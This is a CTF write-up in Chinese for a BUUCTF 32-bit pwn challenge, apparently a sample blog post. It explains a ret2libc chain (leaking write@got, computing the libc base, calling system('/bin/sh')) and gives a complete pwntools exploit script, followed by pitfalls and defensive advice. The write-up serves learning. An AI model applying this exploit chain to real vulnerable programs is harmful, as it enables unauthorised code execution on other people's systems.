BUUCTF PWN：32 位栈溢出与 ret2libc 完整利用链

2026-09-30 · 约 18 分钟 · BUUCTF

NX 开着、没有 canary，但程序里既没有 system 也没有 /bin/sh。 这篇把泄露 libc、算基址、二次溢出这条链完整走一遍，顺便记下我卡了最久的两个坑。

这是一篇示例文章，用来演示正文排版。换成你自己的 writeup 后，把这段提示删掉即可。

题目信息

平台BUUCTF · Pwn
架构32 位 x86 · 动态链接
保护NX enabled / No canary / No PIE / Partial RELRO
知识点栈溢出、GOT 泄露、ret2libc

0. 先看保护

$ checksec ./pwn
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

NX 开着意味着不能往栈上写 shellcode 直接跳，但没有 PIE，说明代码段地址固定， 可以直接用程序自己的 plt / got 表 —— 这就是 ret2libc 的入口。

1. 找溢出点

IDA 里看 main，调用了 vuln()：

void vuln(void) {
    char buf[0x2c];        // 局部缓冲区
    read(0, buf, 0x100);   // 读 256 字节进 44 字节的坑
}

用 gdb 的 cyclic 定位偏移，确认返回值覆盖点在 0x2c + 4 = 0x30， 也就是 48 字节之后（44 字节缓冲区 + 4 字节保存的 ebp）。

小技巧：cyclic 100 生成串，程序崩溃后看 eip 里那四个字节在串里的位置，比肉眼数靠谱得多。

2. 思路：两轮溢出

一次溢出只能跳到程序里已有的函数，拿不到 libc 里的 system。所以拆成两轮：

  1. 第一轮：调用 write(1, write@got, 4)，把 write 在 libc 里的真实地址打印出来，然后返回 main 重新执行，保持进程活着。
  2. 第二轮：用泄露地址减去 write 的 libc 偏移，得到基址，算出 system 和 /bin/sh，再溢出一次。

3. 第一轮：泄露地址

32 位函数调用走栈传参，调用约定是 func(返回地址, arg1, arg2, arg3)，所以栈布局长这样：

payload  = b"A" * 48
payload += p32(elf.plt["write"])   # 返回到 write@plt
payload += p32(elf.symbols["main"])# write 返回后回到 main
payload += p32(1)                  # arg1: fd = stdout
payload += p32(elf.got["write"])   # arg2: 要打印的地址
payload += p32(4)                  # arg3: 打印 4 字节

接收回来就是 write 的真实地址：

io.recvuntil(b"\n")            # 吃掉程序自己的提示
leak = u32(io.recv(4))
log.success("write -> " + hex(leak))

4. 确定 libc 版本

这一步是最容易翻车的地方：用错 libc，偏移全错，第二次溢出会直接崩。 三个常用来源，按可靠度排序：

  • 题目给了 libc.so.6（最省事，直接 ELF("./libc.so.6")）
  • 用最后三位地址去 libc.blukat.me 或 libc-database 查
  • 用 LibcSearcher / one_gadget 辅助匹配，但要注意可能有多个候选
libc = ELF("./libc-2.27.so")
libc_base = leak - libc.symbols["write"]
system    = libc_base + libc.symbols["system"]
binsh     = libc_base + next(libc.search(b"/bin/sh"))

log.success("libc base = " + hex(libc_base))

5. 第二轮：拿 shell

回到 main 后程序会再问一次，这次直接把返回地址换成 system：

payload  = b"A" * 48
payload += p32(system)
payload += p32(0)      # system 的假返回地址
payload += p32(binsh)  # system 的参数

io.send(payload)
io.interactive()

完整脚本（pwntools）大致长这样，省掉了日志和重连逻辑：

#!/usr/bin/env python3
from pwn import *

context(log_level="info", arch="i386", os="linux")

elf  = ELF("./pwn")
libc = ELF("./libc-2.27.so")
io   = process("./pwn")

# --- 第一轮：泄露 write 真实地址 ---
payload  = b"A" * 48
payload += p32(elf.plt["write"])
payload += p32(elf.symbols["main"])
payload += p32(1) + p32(elf.got["write"]) + p32(4)

io.recvuntil(b"input: ")
io.send(payload)
leak = u32(io.recv(4))

libc_base = leak - libc.symbols["write"]
system    = libc_base + libc.symbols["system"]
binsh     = libc_base + next(libc.search(b"/bin/sh"))
log.success(f"libc_base = {libc_base:#x}")

# --- 第二轮：system("/bin/sh") ---
payload  = b"A" * 48
payload += p32(system) + p32(0) + p32(binsh)

io.recvuntil(b"input: ")
io.send(payload)
io.interactive()

踩坑记录

两个坑，加起来花了我一个晚上：

坑一：地址里带了 0x0a

read() 读的是二进制，不会有问题；但如果溢出点用的是 gets() 或 scanf("%s")， 地址里出现 0x0a（换行）会提前截断 payload。这种情况要用 sendlineafter 之外的写法， 或者先 send 再补换行，实在不行就换个 gadget 绕开。

坑二：没回到 main，进程直接退出

第一轮溢出后如果返回地址填的是 0xdeadbeef 之类的垃圾值，write 执行完程序就退出了， 第二轮根本没有机会发。一定要把返回地址填成 main（或者某个还会继续读输入的函数）。

复盘

  • ret2libc 的核心是「已知一个 libc 符号的运行时地址 → 求出基址 → 任意 libc 符号都能用」。
  • 第一轮功能选择上，write 比 puts 好：输出长度可控，不会因为遇到 \x00 提前截断。
  • 泄漏之后务必回到 main，把「读输入」的机会留着。
  • libc 版本一定要匹配，必要时用 ldd / pwninit 修一下本地环境。

防御视角

  • read 的长度不要超过缓冲区大小，这是最直接的修复。
  • 开启 Full RELRO 会让 GOT 只读，但内存泄露依然可行，还需配合 PIE + canary。
  • 32 位程序能开 ASLR 但地址熵低，尽早迁到 64 位并开启全部保护。
